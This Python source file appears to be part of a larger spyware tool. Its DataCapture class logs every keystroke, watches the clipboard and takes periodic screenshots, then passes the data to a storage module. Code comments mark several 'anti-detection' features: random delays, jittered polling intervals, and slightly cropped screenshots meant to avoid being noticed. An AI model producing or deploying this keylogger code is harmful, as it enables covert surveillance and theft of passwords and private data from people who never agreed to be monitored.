import time
import threading
import random
from datetime import datetime
from pynput import keyboard
import pyperclip
import pyautogui
from PIL import Image
import io
import logging

from config_manager import Config
from storage_manager import StorageManager

class DataCapture:
    """Handles all data capture operations"""
    
    def __init__(self, config: Config, storage: StorageManager):
        self.config = config
        self.storage = storage
        self.keystroke_buffer = []
        self.last_clipboard = ""
        self.running = False
        
        # Anti-detection: Randomize screenshot size slightly
        self.screenshot_variation = 5
        
    def start_capture(self):
        """Start all capture threads"""
        self.running = True
        
        if self.config.is_enabled('capture.enable_keystrokes'):
            self._start_keylogger()
        
        if self.config.is_enabled('capture.enable_clipboard'):
            self._start_clipboard_monitor()
        
        if self.config.is_enabled('capture.enable_screenshots'):
            self._start_screenshot_capture()
    
    def stop_capture(self):
        """Stop all capture operations"""
        self.running = False
        self._flush_keystroke_buffer()
    
    def _start_keylogger(self):
        """Start keystroke capture"""
        def on_press(key):
            try:
                timestamp = datetime.now().isoformat()
                if hasattr(key, 'char') and key.char is not None:
                    # Regular character
                    char = key.char
                else:
                    # Special key
                    char = f"[{key.name}]" if hasattr(key, 'name') else str(key)
                
                self.keystroke_buffer.append({
                    'timestamp': timestamp,
                    'key': char,
                    'type': 'keypress'
                })
                
                # Flush buffer periodically to avoid memory buildup
                if len(self.keystroke_buffer) >= 100:
                    self._flush_keystroke_buffer()
                
                # Anti-detection: Random micro-delays
                if self.config.is_enabled('anti_detection.randomize_timing'):
                    delay = random.uniform(0.001, 0.01)
                    time.sleep(delay)
                    
            except Exception as e:
                logging.warning(f"Keylogger error: {e}")
        
        # Start keyboard listener in separate thread
        self.keyboard_listener = keyboard.Listener(on_press=on_press)
        self.keyboard_listener.start()
    
    def _start_clipboard_monitor(self):
        """Start clipboard monitoring"""
        def monitor_clipboard():
            while self.running:
                try:
                    current_clipboard = pyperclip.paste()
                    if current_clipboard != self.last_clipboard and current_clipboard.strip():
                        timestamp = datetime.now().isoformat()
                        self.storage.store_data({
                            'timestamp': timestamp,
                            'content': current_clipboard,
                            'type': 'clipboard'
                        })
                        self.last_clipboard = current_clipboard
                
                except Exception as e:
                    logging.warning(f"Clipboard monitor error: {e}")
                
                # Anti-detection: Randomized intervals
                base_interval = 2
                if self.config.is_enabled('anti_detection.randomize_timing'):
                    interval = base_interval + random.uniform(-0.5, 0.5)
                else:
                    interval = base_interval
                    
                time.sleep(interval)
        
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
    
    def _start_screenshot_capture(self):
        """Start screenshot capture"""
        def capture_screenshots():
            while self.running:
                try:
                    # Take screenshot
                    screenshot = pyautogui.screenshot()
                    
                    # Anti-detection: Slightly vary screenshot dimensions
                    if self.config.is_enabled('anti_detection.randomize_timing'):
                        width, height = screenshot.size
                        crop_x = random.randint(0, self.screenshot_variation)
                        crop_y = random.randint(0, self.screenshot_variation)
                        new_width = width - crop_x - random.randint(0, self.screenshot_variation)
                        new_height = height - crop_y - random.randint(0, self.screenshot_variation)
                        screenshot = screenshot.crop((crop_x, crop_y, new_width, new_height))
                    
                    # Convert to bytes
                    img_buffer = io.BytesIO()
                    screenshot.save(img_buffer, format='JPEG', quality=85)
                    img_data = img_buffer.getvalue()
                    
                    # Store screenshot
                    timestamp = datetime.now().isoformat()
                    self.storage.store_binary_data(img_data, {
                        'timestamp': timestamp,
                        'type': 'screenshot',
                        'format': 'jpeg'
                    })
                
                except Exception as e:
                    logging.warning(f"Screenshot capture error: {e}")
                
                # Wait for next screenshot
                interval = self.config.get('capture.screenshot_interval', 300)
                if self.config.is_enabled('anti_detection.randomize_timing'):
                    # Add randomization: ±10% of interval
                    variation = interval * 0.1
                    interval += random.uniform(-variation, variation)
                
                time.sleep(interval)
        
        screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
        screenshot_thread.start()
    
    def _flush_keystroke_buffer(self):
        """Flush keystroke buffer to storage"""
        if self.keystroke_buffer:
            timestamp = datetime.now().isoformat()
            self.storage.store_data({
                'timestamp': timestamp,
                'keystrokes': self.keystroke_buffer.copy(),
                'type': 'keystroke_batch'
            })
            self.keystroke_buffer.clear()